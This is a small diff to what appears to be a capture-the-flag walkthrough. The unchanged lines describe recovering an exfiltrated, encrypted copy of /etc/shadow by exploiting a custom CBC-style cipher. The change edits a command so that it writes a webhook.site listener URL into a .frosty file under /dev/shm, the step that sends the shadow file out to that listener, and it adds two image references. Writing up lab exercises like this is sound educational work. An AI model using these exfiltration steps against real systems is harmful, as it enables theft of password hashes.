@@ -47,7 +47,11 @@ The script’s custom boxCrypto function functioned as a CBC (Cipher Block Chain
 
 Since we captured the full ciphertext, we could decrypt every block except the first one (6 bytes), which was encrypted with a random IV. Losing the first 6 bytes of /etc/shadow (root:$) was acceptable as the hash remained intact.
 
-I set up a webhook.site listener to capture the POST request and then created the .frosty file with `echo "" &gt; /dev/shm/pwn.frosty1337`
+I set up a webhook.site listener to capture the POST request and then created the .frosty file with `echo "http://webhook.site<UID>" > /dev/shm/pwn.frosty1337`
+
+<img src="./images/media/img294.png"/>
+
+<img src="./images/media/img295.png"/>
 
 <img src="./images/media/image284.png"/>
 
